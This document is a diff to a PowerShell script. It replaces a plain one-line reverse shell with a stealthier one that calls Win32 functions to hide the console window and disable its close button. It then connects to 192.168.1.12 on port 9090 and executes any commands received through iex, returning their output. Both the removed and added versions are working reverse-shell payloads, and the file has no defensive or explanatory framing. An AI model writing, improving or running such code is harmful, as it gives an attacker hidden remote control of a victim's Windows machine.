@@ -1,3 +1,15 @@
-
-Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("192.168.1.12",9090));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
+$H=Add-Type -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern IntPtr GetSystemMenu(IntPtr h,bool r);[DllImport("user32.dll")]public static extern bool EnableMenuItem(IntPtr h,uint i,uint f);[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);' -Name Win32 -Namespace W -PassThru;
+$hw=$H::GetConsoleWindow();
+if($hw -ne [IntPtr]::Zero){
+  [void]$H::EnableMenuItem($H::GetSystemMenu($hw,$false),0xF060,1);
+  [void]$H::ShowWindow($hw,0);
+}
+$c=New-Object Net.Sockets.TCPClient('192.168.1.12',9090);
+$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
+while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
+  $r=(iex $d 2>&1|Out-String);
+  $x=([text.encoding]::ASCII).GetBytes($r);
+  $s.Write($x,0,$x.Length);$s.Flush()
+};
+$c.Close()
